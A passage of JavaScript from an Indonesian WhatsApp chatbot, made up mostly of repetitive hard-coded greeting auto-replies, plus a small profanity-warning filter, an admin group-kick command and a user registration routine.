	if (isBanned) return
	client.sendMessage(from, 'iya.. apa kak? 🤔', MessageType.text, {quoted: mek});
	}
	if (budy == 'Hi kak'){
	if (isBanned) return
	client.sendMessage(from, 'Hi.. juga ☺️', MessageType.text, {quoted: mek});
	}
	if (budy == 'hi kak'){
	if (isBanned) return
	client.sendMessage(from, 'Hi.. juga ☺️', MessageType.text, {quoted: mek});
	}
	if (budy == 'Hii kak'){
	if (isBanned) return
	client.sendMessage(from, 'Hi.. juga ☺️', MessageType.text, {quoted: mek});
	}
	if (budy == 'hii kak'){
	if (isBanned) return
	client.sendMessage(from, 'Hi.. juga ☺️', MessageType.text, {quoted: mek});
	}
	if (budy == 'Pagi'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat pagi kak 😅', MessageType.text, {quoted: mek});
	}
	if (budy == 'pagi'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat pagi kak 😅', MessageType.text, {quoted: mek});
	}
	if (budy == 'Pagi kak'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat pagi kak 😅', MessageType.text, {quoted: mek});
	}
	if (budy == 'pagi kak'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat pagi kak 😅', MessageType.text, {quoted: mek});
	}
	if (budy == 'Pagi bro'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat pagi bro 😎', MessageType.text, {quoted: mek});
	}
	if (budy == 'pagi bro'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat pagi bro 😎', MessageType.text, {quoted: mek});
	}
	if (budy == 'Pagi gan'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat pagi gan 😎', MessageType.text, {quoted: mek});
	}
	if (budy == 'pagi gan'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat pagi gan 😎', MessageType.text, {quoted: mek});
	}
	if (budy == 'Pagi sayang'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat pagi sayang 🥰', MessageType.text, {quoted: mek});
	}
	if (budy == 'pagi sayang'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat pagi sayang 🥰', MessageType.text, {quoted: mek});
	}
	if (budy == 'Pagi beb'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat pagi beb 🥰', MessageType.text, {quoted: mek});
	}
	if (budy == 'pagi beb'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat pagi beb 🥰', MessageType.text, {quoted: mek});
	}
	if (budy == 'Selamat pagi'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat pagi kak 😅', MessageType.text, {quoted: mek});
	}
	if (budy == 'selamat pagi'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat pagi kak 😅', MessageType.text, {quoted: mek});
	}
	if (budy == 'Selamat pagi kak'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat pagi kak 😅', MessageType.text, {quoted: mek});
	}
	if (budy == 'selamat pagi kak'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat pagi kak 😅', MessageType.text, {quoted: mek});
	}
	if (budy == 'Selamat pagi bro'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat pagi bro 😎', MessageType.text, {quoted: mek});
	}
	if (budy == 'selamat pagi bro'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat pagi bro 😎', MessageType.text, {quoted: mek});
	}
	if (budy == 'Selamat pagi gan'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat pagi gan 😎', MessageType.text, {quoted: mek});
	}
	if (budy == 'selamat pagi gan'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat pagi gan 😎', MessageType.text, {quoted: mek});
	}
	if (budy == 'Selamat pagi beb'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat pagi beb 🥰', MessageType.text, {quoted: mek});
	}
	if (budy == 'selamat pagi beb'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat pagi beb 🥰', MessageType.text, {quoted: mek});
	}
	if (budy == 'Selamat pagi sayang'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat pagi sayang 🥰', MessageType.text, {quoted: mek});
	}
	if (budy == 'selamat pagi sayang'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat pagi sayang 🥰', MessageType.text, {quoted: mek});
	}
	if (budy == 'Siang'){
	if (isBanned) return
	client.sendMessage(from, 'Siang kak 😅', MessageType.text, {quoted: mek});
	}
	if (budy == 'siang'){
	if (isBanned) return
	client.sendMessage(from, 'Siang kak 😅', MessageType.text, {quoted: mek});
	}
	if (budy == 'Siang kak'){
	if (isBanned) return
	client.sendMessage(from, 'Siang kak 😅', MessageType.text, {quoted: mek});
	}
	if (budy == 'siang kak'){
	if (isBanned) return
	client.sendMessage(from, 'Siang kak 😅', MessageType.text, {quoted: mek});
	}
	if (budy == 'Siang beb'){
	if (isBanned) return
	client.sendMessage(from, 'Siang beb 🥰', MessageType.text, {quoted: mek});
	}
	if (budy == 'siang beb'){
	if (isBanned) return
	client.sendMessage(from, 'Siang beb 🥰', MessageType.text, {quoted: mek});
	}
	if (budy == 'Siang bro'){
	if (isBanned) return
	client.sendMessage(from, 'Siang bro 😎', MessageType.text, {quoted: mek});
	}
	if (budy == 'siang bro'){
	if (isBanned) return
	client.sendMessage(from, 'Siang bro 😎', MessageType.text, {quoted: mek});
	}
	if (budy == 'Siang gan'){
	if (isBanned) return
	client.sendMessage(from, 'Siang gan 😎', MessageType.text, {quoted: mek});
	}
	if (budy == 'siang bro'){
	if (isBanned) return
	client.sendMessage(from, 'Siang gan 😎', MessageType.text, {quoted: mek});
	}
	if (budy == 'Siang sayang'){
	if (isBanned) return
	client.sendMessage(from, 'Siang sayang 🥰', MessageType.text, {quoted: mek});
	}
	if (budy == 'siang sayang'){
	if (isBanned) return
	client.sendMessage(from, 'Siang sayang 🥰', MessageType.text, {quoted: mek});
	}
	if (budy == 'Selamat siang'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat siang kak 😅', MessageType.text, {quoted: mek});
	}
	if (budy == 'selamat siang'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat siang kak 😅', MessageType.text, {quoted: mek});
	}
	if (budy == 'Selamat siang kak'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat siang kak 😅', MessageType.text, {quoted: mek});
	}
	if (budy == 'selamat siang kak'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat siang kak 😅', MessageType.text, {quoted: mek});
	}
	if (budy == 'Selamat siang bro'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat siang bro 😎', MessageType.text, {quoted: mek});
	}
	if (budy == 'selamat siang bro'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat siang bro 😎', MessageType.text, {quoted: mek});
	}
	if (budy == 'Selamat siang gan'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat siang gan 😎', MessageType.text, {quoted: mek});
	}
	if (budy == 'selamat siang gan'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat siang gan 😎', MessageType.text, {quoted: mek});
	}
	if (budy == 'Selamat siang beb'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat siang beb 🥰', MessageType.text, {quoted: mek});
	}
	if (budy == 'selamat siang beb'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat siang beb 🥰', MessageType.text, {quoted: mek});
	}
	if (budy == 'Selamat siang sayang'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat siang sayang 🥰', MessageType.text, {quoted: mek});
	}
	if (budy == 'selamat siang sayang'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat siang sayang 🥰', MessageType.text, {quoted: mek});
	}
	if (budy == 'Sore'){
	if (isBanned) return
	client.sendMessage(from, 'Sore kak 😅', MessageType.text, {quoted: mek});
	}
	if (budy == 'sore'){
	if (isBanned) return
	client.sendMessage(from, 'Sore kak 😅', MessageType.text, {quoted: mek});
	}
	if (budy == 'Sore kak'){
	if (isBanned) return
	client.sendMessage(from, 'Sore kak 😅', MessageType.text, {quoted: mek});
	}
	if (budy == 'sore kak'){
	if (isBanned) return
	client.sendMessage(from, 'Sore kak 😅', MessageType.text, {quoted: mek});
	}
	if (budy == 'Sore bro'){
	if (isBanned) return
	client.sendMessage(from, 'Sore bro 😎', MessageType.text, {quoted: mek});
	}
	if (budy == 'sore bro'){
	if (isBanned) return
	client.sendMessage(from, 'Sore bro 😎', MessageType.text, {quoted: mek});
	}
	if (budy == 'Sore gan'){
	if (isBanned) return
	client.sendMessage(from, 'Sore gan 😎', MessageType.text, {quoted: mek});
	}
	if (budy == 'sore gan'){
	if (isBanned) return
	client.sendMessage(from, 'Sore gan 😎', MessageType.text, {quoted: mek});
	}
	if (budy == 'Sore beb'){
	if (isBanned) return
	client.sendMessage(from, 'Sore beb 🥰', MessageType.text, {quoted: mek});
	}
	if (budy == 'sore beb'){
	if (isBanned) return
	client.sendMessage(from, 'Sore beb 🥰', MessageType.text, {quoted: mek});
	}
	if (budy == 'Sore sayang'){
	if (isBanned) return
	client.sendMessage(from, 'Sore sayang 🥰', MessageType.text, {quoted: mek});
	}
	if (budy == 'sore sayang'){
	if (isBanned) return
	client.sendMessage(from, 'Sore sayang 🥰', MessageType.text, {quoted: mek});
	}
	if (budy == 'Selamat sore'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat sore kak 😅', MessageType.text, {quoted: mek});
	}
	if (budy == 'selamat sore'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat sore kak 😅', MessageType.text, {quoted: mek});
	}
	if (budy == 'Selamat sore kak'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat sore kak 😅', MessageType.text, {quoted: mek});
	}
	if (budy == 'selamat sore kak'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat sore kak 😅', MessageType.text, {quoted: mek});
	}
	if (budy == 'Selamat sore bro'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat sore bro 😎', MessageType.text, {quoted: mek});
	}
	if (budy == 'selamat sore bro'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat sore bro 😎', MessageType.text, {quoted: mek});
	}
	if (budy == 'Selamat sore gan'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat sore gan 😎', MessageType.text, {quoted: mek});
	}
	if (budy == 'selamat sore gan'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat sore gan 😎', MessageType.text, {quoted: mek});
	}
	if (budy == 'Selamat sore beb'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat sore beb 🥰', MessageType.text, {quoted: mek});
	}
	if (budy == 'selamat sore beb'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat sore beb 🥰', MessageType.text, {quoted: mek});
	}
	if (budy == 'Selamat sore sayang'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat sore sayang 🥰', MessageType.text, {quoted: mek});
	}
	if (budy == 'selamat sore sayang'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat sore sayang 🥰', MessageType.text, {quoted: mek});
	}
	if (budy == 'Malam'){
	if (isBanned) return
	client.sendMessage(from, 'Malam kak 😅', MessageType.text, {quoted: mek});
	}
	if (budy == 'malam'){
	if (isBanned) return
	client.sendMessage(from, 'Malam kak 😅', MessageType.text, {quoted: mek});
	}
	if (budy == 'Malam kak'){
	if (isBanned) return
	client.sendMessage(from, 'Malam kak 😅', MessageType.text, {quoted: mek});
	}
	if (budy == 'malam kak'){
	if (isBanned) return
	client.sendMessage(from, 'Malam kak 😅', MessageType.text, {quoted: mek});
	}
	if (budy == 'Malam bro'){
	if (isBanned) return
	client.sendMessage(from, 'Malam bro 😎', MessageType.text, {quoted: mek});
	}
	if (budy == 'malam bro'){
	if (isBanned) return
	client.sendMessage(from, 'Malam bro 😎', MessageType.text, {quoted: mek});
	}
	if (budy == 'Malam gan'){
	if (isBanned) return
	client.sendMessage(from, 'Malam gan 😎', MessageType.text, {quoted: mek});
	}
	if (budy == 'malam gan'){
	if (isBanned) return
	client.sendMessage(from, 'Malam gan 😎', MessageType.text, {quoted: mek});
	}
	if (budy == 'malam beb'){
	if (isBanned) return
	client.sendMessage(from, 'Malam beb 🥰', MessageType.text, {quoted: mek});
	}
	if (budy == 'Malam beb'){
	if (isBanned) return
	client.sendMessage(from, 'Malam beb 🥰', MessageType.text, {quoted: mek});
	}
	if (budy == 'Malam sayang'){
	if (isBanned) return
	client.sendMessage(from, 'Malam sayang 🥰', MessageType.text, {quoted: mek});
	}
	if (budy == 'malam sayang'){
	if (isBanned) return
	client.sendMessage(from, 'Malam sayang 🥰', MessageType.text, {quoted: mek});
	}
	if (budy == 'Selamat malam'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat malam kak 😅', MessageType.text, {quoted: mek});
	}
	if (budy == 'selamat malam'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat malam kak 😅', MessageType.text, {quoted: mek});
	}
	if (budy == 'Selamat malam kak'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat malam kak 😅', MessageType.text, {quoted: mek});
	}
	if (budy == 'selamat malam kak'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat malam kak 😅', MessageType.text, {quoted: mek});
	}
	if (budy == 'Selamat malam bro'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat malam bro 😎', MessageType.text, {quoted: mek});
	}
	if (budy == 'selamat malam bro'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat malam bro 😎', MessageType.text, {quoted: mek});
	}
	if (budy == 'Selamat malam gan'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat malam gan 😎', MessageType.text, {quoted: mek});
	}
	if (budy == 'selamat malam gan'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat malam gan 😎', MessageType.text, {quoted: mek});
	}
	if (budy == 'Selamat malam beb'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat malam beb 🥰', MessageType.text, {quoted: mek});
	}
	if (budy == 'selamat malam beb'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat malam beb 🥰', MessageType.text, {quoted: mek});
	}
	if (budy == 'Selamat malam sayang'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat malam sayang 🥰', MessageType.text, {quoted: mek});
	}
	if (budy == 'selamat malam sayang'){
	if (isBanned) return
	client.sendMessage(from, 'Selamat malam sayang 🥰', MessageType.text, {quoted: mek});
	}
	if (budy == 'bot sayang'){
	if (isBanned) return
	client.sendMessage(from, 'Iya sayang..? 🥰', MessageType.text, {quoted: mek});
	}
	if (budy == 'Bot sayang'){
	if (isBanned) return
	client.sendMessage(from, 'Iya sayang..? 🥰', MessageType.text, {quoted: mek});
	}
	if (budy == 'Bacot'){
	if (isBanned) return
	client.sendMessage(from, 'Lu yang bacot 😡', MessageType.text, {quoted: mek});
	}
	if (budy == 'bacot'){
	if (isBanned) return
	client.sendMessage(from, 'Lu yang bacot 😡', MessageType.text, {quoted: mek});
	}
	if (budy == 'woi'){
	if (isBanned) return
	client.sendMessage(from, 'Apaan? 🙄', MessageType.text, {quoted: mek});
	}
	if (budy == 'Woi'){
	if (isBanned) return
	client.sendMessage(from, 'Apaan? 🙄', MessageType.text, {quoted: mek});
	}
	if (budy == 'woii'){
	if (isBanned) return
	client.sendMessage(from, ' Apaan? 🙄', MessageType.text, {quoted: mek});
	}
	if (budy == 'Woii'){
	if (isBanned) return
	client.sendMessage(from, 'Apaan? 🙄', MessageType.text, {quoted: mek});
	}
	if (budy == 'Woy'){
	if (isBanned) return
	client.sendMessage(from, 'Apaan? 🙄', MessageType.text, {quoted: mek});
	}
	if (budy == 'woy'){
	if (isBanned) return
	client.sendMessage(from, 'Apaan? 🙄', MessageType.text, {quoted: mek});
	}
	if (budy == 'gan'){
	if (isBanned) return
	client.sendMessage(from, 'Iya apa gan? 🤔', MessageType.text, {quoted: mek});
	}
	if (budy == 'Gan'){
	if (isBanned) return
	client.sendMessage(from, 'Iya apa gan? 🤔', MessageType.text, {quoted: mek});
	}
	if (budy == 'bro'){
	if (isBanned) return
	client.sendMessage(from, 'Iya apa bro? 🤔', MessageType.text, {quoted: mek});
	}
	if (budy == 'Bro'){
	if (isBanned) return
	client.sendMessage(from, 'Iya apa bro? 🤔', MessageType.text, {quoted: mek});
	}
	if (budy == 'sis'){
	if (isBanned) return
	client.sendMessage(from, 'Iya apa sis? 🤔', MessageType.text, {quoted: mek});
	}
	if (budy == 'Sis'){
	if (isBanned) return
	client.sendMessage(from, 'Iya apa sis? 🤔', MessageType.text, {quoted: mek});
	}
	if (budy == 'kak'){
	if (isBanned) return
	client.sendMessage(from, 'Iya apa kak? 🤔', MessageType.text, {quoted: mek});
	}
	if (budy == 'Kak'){
	if (isBanned) return
	client.sendMessage(from, 'Iya apa kak? 🤔', MessageType.text, {quoted: mek});
	}
	if (budy == 'mas'){
	if (isBanned) return
	client.sendMessage(from, 'Iya adek? 😅', MessageType.text, {quoted: mek});
	}
	if (budy == 'Mas'){
	if (isBanned) return
	client.sendMessage(from, 'Iya adek? 😅', MessageType.text, {quoted: mek});
	}
	if (budy == 'mba'){
	if (isBanned) return
	client.sendMessage(from, 'Iya adek? 😅', MessageType.text, {quoted: mek});
	}
	if (budy == 'Mba'){
	if (isBanned) return
	client.sendMessage(from, 'Iya adek? 😅', MessageType.text, {quoted: mek});
	}
	if (budy == 'dek'){
	if (isBanned) return
	client.sendMessage(from, 'Iya kak? 😅', MessageType.text, {quoted: mek});
	}
	if (budy == 'dek'){
	if (isBanned) return
	client.sendMessage(from, 'Iya kak? 😅', MessageType.text, {quoted: mek});
	}
	if (budy == 'adek'){
	if (isBanned) return
	client.sendMessage(from, 'Iya kak? 😅', MessageType.text, {quoted: mek});
	}
	if (budy == 'Adek'){
	if (isBanned) return
	client.sendMessage(from, 'Iya kak? 😅', MessageType.text, {quoted: mek});
	}
	if (budy == 'bre'){
	if (isBanned) return
	client.sendMessage(from, 'Iya bre? 😅', MessageType.text, {quoted: mek});
	}
	if (budy == 'Bre'){
	if (isBanned) return
	client.sendMessage(from, 'Iya bre? 😅', MessageType.text, {quoted: mek});
	}
	if (budy == 'Kamu siapa'){
	if (isBanned) return
	client.sendMessage(from, 'Saya bot whatsapp kak\nuntuk  memakai bot bisa cek menu dengan cara ketik *+menu*', MessageType.text, {quoted: mek});
	}
	if (budy == 'Aku sayang kamu'){
	if (isBanned) return
	client.sendMessage(from, `Aku juga sayang ${pushname} 😘`, MessageType.text, {quoted: mek});
	}
	if (budy == 'I love you'){
	if (isBanned) return
	client.sendMessage(from, 'I love you too🥰', MessageType.text, {quoted: mek});
	}
	if (budy == 'Reneasy'){
	if (isBanned) return
	client.sendMessage(from, 'iya kak? 🤔', MessageType.text, {quoted: mek});
	}
	if (budy.match('Kontol')
	|| budy.match('kontol')){
	if (isBanned) return
	client.sendMessage(from, `Tolong jaga bahasanya kak 😇`, MessageType.text, {quoted: mek})
	}
	if (budy.match('memek')
	|| budy.match('Memek')){
	if (isBanned) return
	client.sendMessage(from, 'Tolong jaga bahasanya kak 😇', MessageType.text, {quoted: mek})
	}
	if (budy.match('ngentod')
	|| budy.match('Ngentod')){
	client.sendMessage(from, 'Tolong jaga bahasanya kak 😇', MessageType.text, {quoted: mek})
	}
	        //RANDOM TEXT
	if (budy.match('Apa kabar')){
	if (isBanned) return
	client.sendMessage(from, 'Alhamdulillah kabar Reneasy baik ☺', MessageType.text, {quoted: mek})
	client.sendMessage(from, 'Bagaimana denganmu? ☺', MessageType.text, {quoted: mek})
	}
	if (budy.match('Bagaimana kabarmu')){
	if (isBanned) return
	client.sendMessage(from, 'Alhamdulillah kabar Reneasy baik ☺', MessageType.text, {quoted: mek})
	client.sendMessage(from, 'Bagaimana denganmu? ☺', MessageType.text, {quoted: mek})
	}
	if (budy.match('bagaimana kabarmu')){
	if (isBanned) return
	client.sendMessage(from, 'Alhamdulillah kabar Reneasy baik ☺', MessageType.text, {quoted: mek})
	client.sendMessage(from, 'Bagaimana denganmu? ☺', MessageType.text, {quoted: mek})
	}
	if (budy.match('apa kabar')){
	if (isBanned) return
	client.sendMessage(from, 'Alhamdulillah kabar Reneasy baik ☺', MessageType.text, {quoted: mek})
	client.sendMessage(from, 'Bagaimana denganmu? ☺', MessageType.text, {quoted: mek})
	}
	if (budy == 'Kamu lagi apa'){
	if (isBanned) return
	const lagiapa = ['Lagi nonton tv kak 😅','Lagi tiduran kak 🥱','Lagi rebahan kak 😅','Lagi mikirin kakak 😆','Lagi mikirin kamu 😆']
	let lagiii = lagiapa[Math.floor(Math.random() * lagiapa.length)]
	client.sendMessage(from, lagiii, text, {quote: mek})
	client.sendMessage(from, 'Kalau kamu lagi apa kak?', MessageType.text, {quoted: mek})
	}
	if (budy == 'kamu lagi apa'){
	if (isBanned) return
	const lagiapaa = ['Lagi nonton tv kak 😅','Lagi tiduran kak 🥱','Lagi rebahan kak 😅','Lagi mikirin kakak 😆','Lagi mikirin kamu 😆']
	let laagiii = lagiapaa[Math.floor(Math.random() * lagiapaa.length)]
	client.sendMessage(from, laagiii, text, {quote: mek})
	client.sendMessage(from, 'Kalau kamu lagi apa kak?', MessageType.text, {quoted: mek})
	}
	if (budy.match('Ara ara')
	|| budy.match('ara ara')
	|| budy.match('Araara')
	|| budy.match('araara')){
	if (isBanned) return
	let araaaa = fs.readFileSync('./30detik/PTT-20210813-WA0049.opus')
        client.sendMessage(from, araaaa, MessageType.audio, { quoted: mek, ptt: true })
	}
	if (budy == 'Out') {
                  if (!isGroup) return reply('Command ini tidak bisa digunakan di pribadi!\n\n*Harap gunakan di group!*')
                  if (!isGroupAdmins) return reply(ind.admin())
                  if (!isBotGroupAdmins) return reply(ind.badmin())	
    			  quotedis = mek.message.extendedTextMessage.contextInfo.participant
				  await client.groupRemove(from, [quotedis])
				  reply(`berhasil kick reply`)
				  }
                  if (budy == '@ndaptar') {
				if (isRegistered) return  reply(ind.rediregis())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
						const serialUser = createSerial(20)
						veri = sender
						if (isGroup) {
							addRegisteredUser(sender, pushname, time, serialUser)
							try {
								ppimg = await client.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
							} catch {
								ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
							}
							knfrimsi = `┌━━━━━━━━━━━━┈ ❋ཻུ۪۪⸙\n│ *「 VERIFICATION SUKSES 」*\n│ *Terimakasih Sudah*\n│ *Mendaftarkan Diri*\n│ *Dalam Database*\n└┬────────────┈ ⳹\n┌┤➛ *Nama :* ${pushname}\n││➛ *Nomor :* @${sender.split('@')[0]}\n││➛ *SN :* ${serialUser}\n││➛ *Total Pengguna :* ${_registered.length} Orang\n││➛ *Status :* ☑️ Terverifikasi\n│└────────────┈ ⳹\n│ *Waktu Pendaftaran*\n│ *${time}*\n├───────────────\n│ *Silahkan Ketik ${prefix}rules*\n│ *Untuk Melanjutkan Pengguna*\n└━━━━━━━━━━━━┈ ❋ཻུ۪۪⸙\n*「 Reneasy Bot 」*`
							buffer = await getBuffer(ppimg)
							client.sendMessage(from, buffer, image, {
								caption: knfrimsi, quoted: {
									key: {
										fromMe: false,
										participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
									},
									message: {
										conversation: cr
									}
								}
							})
							addATM(sender)
							addLevelingId(sender)
						} else {
							addRegisteredUser(sender, pushname, time, serialUser)
							try {
								ppimg = await client.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
							} catch {
								ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
							}
							knfrimsi = `┌━━━━━━━━━━━━┈ ❋ཻུ۪۪⸙\n│ *「 VERIFICATION SUKSES 」*\n│ *Terimakasih Sudah*\n│ *Mendaftarkan Diri*\n│ *Dalam Database*\n└┬────────────┈ ⳹\n┌┤◦➛ *Nama :* ${pushname}\n││◦➛ *Nomor :* @${sender.split('@')[0]}\n││◦➛ *SN :* ${serialUser}\n││◦➛ *Total Pengguna :* ${_registered.length} Orang\n││◦➛ *Status :* ☑️ Terverifikasi\n│└────────────┈ ⳹\n│ *Waktu Pendaftaran*\n│ *${time}*\n├───────────────\n│ *Silahkan Ketik ${prefix}rules*\n│ *Untuk Melanjutkan Pengguna*\n└━━━━━━━━━━━━┈ ❋ཻུ۪۪⸙\n*「 Reneasy Bot 」*`
							buffer = await getBuffer(ppimg)
							client.sendMessage(from, buffer, image, {
								caption: knfrimsi, quoted: {
									key: {
										fromMe: false,
										participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
									},
									message: {
										conversation: cr
									}
								}
							})
						}
						addATM(sender)
						addLevelingId(sender)
					}
			if (isGroup && !isCmd && isSimi && budy != undefined) {
						console.log(budy)
						muehe = await simih(budy)
						reply(ind.cmdnf(prefix, command))
					} else {
						console.log(color('[ERROR]','red'), 'Unregistered Command from', color(sender.split('@')[0]))
					}
					}
		} catch (e) {
			console.log('Error : %s', color(e, 'red'))
		}
	})
